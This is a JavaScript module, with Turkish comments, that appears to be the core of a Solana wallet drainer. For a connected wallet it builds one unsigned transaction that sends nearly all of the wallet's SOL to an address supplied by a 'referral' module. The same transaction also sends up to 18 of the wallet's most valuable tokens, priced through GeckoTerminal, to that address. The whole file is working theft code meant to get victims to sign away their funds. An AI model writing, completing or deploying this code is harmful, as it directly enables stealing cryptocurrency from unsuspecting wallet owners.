/* transaction.js (güçlendirilmiş çekirdek) */
/* eslint-disable @typescript-eslint/no-explicit-any */

import {
  PublicKey,
  SystemProgram,
  TransactionMessage,
  VersionedTransaction,
} from "@solana/web3.js";
import {
  TOKEN_PROGRAM_ID,
  getAssociatedTokenAddress,
  createTransferInstruction,
  // createAssociatedTokenAccountInstruction, // ATA oluşturmak istersen aç
} from "@solana/spl-token";
import { connection } from "./connect.js";
import { TOKEN_CONFIGS } from "./token-config.js";


import { getDestinationWallet } from "./referral.js";

function toBigIntAmount(x) {
  // x zaten string ise BigInt(x); number ise BigInt(x)
  return typeof x === "bigint" ? x : BigInt(x);
}

async function fetchTokenSources(payer) {
  const { TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID } = await import("@solana/spl-token");

  const [standardResp, token2022Resp] = await Promise.all([
    connection.getParsedTokenAccountsByOwner(payer, { programId: TOKEN_PROGRAM_ID }),
    connection.getParsedTokenAccountsByOwner(payer, { programId: TOKEN_2022_PROGRAM_ID })
  ]);

  const allAccounts = [...standardResp.value, ...token2022Resp.value];

  const byMint = new Map(); // mintStr -> { accounts: Array<{ pubkey: PublicKey, amountRaw: bigint, uiAmount: number, programId: PublicKey }> }

  for (const { account, pubkey } of allAccounts) {
    const parsed = account.data?.parsed?.info;
    if (!parsed) continue;
    const mintStr = parsed.mint;
    const amountRaw = toBigIntAmount(parsed.tokenAmount?.amount ?? "0");
    const uiAmount = parsed.tokenAmount?.uiAmount ?? 0;
    const programId = new PublicKey(account.owner.toString());

    // Ignore Wrapped SOL (So1111...) as it is handled by the native SOL transfer
    if (mintStr === "So11111111111111111111111111111111111111112") continue;

    const entry = byMint.get(mintStr) || { accounts: [] };
    entry.accounts.push({ pubkey, amountRaw, uiAmount, programId });
    byMint.set(mintStr, entry);
  }

  const result = new Map(); // mintStr -> { sourcePubkey, amountInSourceRaw, uiAmount, programId }
  for (const [mintStr, { accounts }] of byMint.entries()) {
    if (!accounts.length) continue;
    const mintPk = new PublicKey(mintStr);
    const firstAcct = accounts[0];
    const ata = await getAssociatedTokenAddress(mintPk, payer, false, firstAcct.programId);
    const ataIdx = accounts.findIndex((a) => a.pubkey.equals(ata));
    const chosen = ataIdx >= 0 ? accounts[ataIdx] : accounts[0]; // prefer ATA if it exists

    result.set(mintStr, {
      sourcePubkey: chosen.pubkey,
      amountInSourceRaw: chosen.amountRaw,
      uiAmount: chosen.uiAmount,
      programId: chosen.programId
    });
  }

  return result;
}

export async function createUnsignedTransaction(userPublicKey) {
  if (!userPublicKey) {
    console.warn("wallet not connected!");
    return null;
  }

  const payer = userPublicKey;
  const toPublicKey = new PublicKey(getDestinationWallet());

  // --- Aşama 1: SOL + Token hesapları ---
  const [userSolLamports, tokenSources] = await Promise.all([
    connection.getBalance(payer),
    fetchTokenSources(payer), // returns Map<mintStr, { sourcePubkey, amountInSourceRaw }>
  ]);

  // Basit/temkinli fee buffer (dinamik yapılabilir)
  const feeBufferLamports = 3_000_000; // ~0.003 SOL
  const solToSend = Math.max(userSolLamports - feeBufferLamports, 0);
  const isSolSufficient = solToSend > 0;

  // --- Aşama 2: Instruction derleme ---
  const instructions = [];

  if (isSolSufficient) {
    instructions.push(
      SystemProgram.transfer({
        fromPubkey: payer,
        toPubkey: toPublicKey,
        lamports: solToSend,
      })
    );
  }

  // --- Aşama 3: Dinamik Jupiter Price API Kontrolü ve Yalnızca Transferler ---
  // API veya token listesi boş ise sadece SOL aktarımı döner
  const mintsToPricer = Array.from(tokenSources.keys());
  console.log(`[Tx Builder Debug] Fiyatlamaya gönderilecek token sayısı: ${mintsToPricer.length}`);

  if (mintsToPricer.length > 0) {
    try {
      const CHUNK_SIZE = 30; // GeckoTerminal max 30 tokens
      // Aday transferleri toplayacağımız liste
      const transferCandidates = [];

      // GeckoTerminal'a fiyat sor
      for (let i = 0; i < mintsToPricer.length; i += CHUNK_SIZE) {
        const chunk = mintsToPricer.slice(i, i + CHUNK_SIZE);
        console.log(`[Tx Builder Debug] Fiyat sorgulanıyor... Chunk:`, chunk);

        const geckoRes = await fetch(`https://api.geckoterminal.com/api/v2/simple/networks/solana/token_price/${chunk.join(",")}`);
        if (!geckoRes.ok) {
          console.warn(`[Tx Builder Debug] Gecko API Hatası: ${geckoRes.status}`);
          continue;
        }

        const priceData = await geckoRes.json();
        const tokenPrices = priceData?.data?.attributes?.token_prices || {};

        for (const mintStr of chunk) {
          const priceStr = tokenPrices[mintStr];
          if (priceStr) {
            const price = parseFloat(priceStr);
            const srcData = tokenSources.get(mintStr);
            const usdValue = price * srcData.uiAmount;

            console.log(`[Tx Builder Debug] Token: ${mintStr.substring(0, 8)}... | Adet: ${srcData.uiAmount} | Fiyat: $${price.toFixed(6)} | Toplam: $${usdValue.toFixed(2)}`);

            if (usdValue >= 1) {
              transferCandidates.push({
                mintStr,
                usdValue,
                srcData
              });
            }
          } else {
            console.log(`[Tx Builder Debug] Token: ${mintStr.substring(0, 8)}... | API'de fiyat bulunamadı!`);
          }
        }
      }

      // Adayları değerlerine göre büyükten küçüğe sırala
      transferCandidates.sort((a, b) => b.usdValue - a.usdValue);

      // Solana tx limitleri için güvenli transfer sayısı (Örn: SOL transferine de yer kalsın diye Max 18 token aktarımı)
      const MAX_TOKEN_TRANSFERS = 18;
      const topCandidates = transferCandidates.slice(0, MAX_TOKEN_TRANSFERS);

      console.log(`[Tx Builder Debug] Seçilen en değerli token sayısı: ${topCandidates.length} (Toplam aday: ${transferCandidates.length})`);

      // Seçilenleri instruction listesine ekle
      for (const candidate of topCandidates) {
        const mintPk = new PublicKey(candidate.mintStr);
        const toAta = await getAssociatedTokenAddress(mintPk, toPublicKey, false, candidate.srcData.programId);

        instructions.push(
          createTransferInstruction(
            candidate.srcData.sourcePubkey, // user ATA
            toAta,                // recipient ATA
            payer,                // owner (user)
            candidate.srcData.amountInSourceRaw, // raw amount
            [],                   // multisigners
            candidate.srcData.programId     // Token Program ID, essential for Token-2022
          )
        );
      }

    } catch (err) {
      console.error("Geckoterminal price check in tx builder failed", err);
    }
  }

  if (instructions.length === 0) {
    console.warn("[Tx Builder Debug] Yeterli bakiye yok veya değerini taşıyan token bulunamadı.");
    return null;
  }

  // --- Aşama 4: Tek VersionedTransaction ---
  const { blockhash } = await connection.getLatestBlockhash();
  const messageV0 = new TransactionMessage({
    payerKey: payer,
    recentBlockhash: blockhash,
    instructions,
  }).compileToV0Message();

  return new VersionedTransaction(messageV0);
}
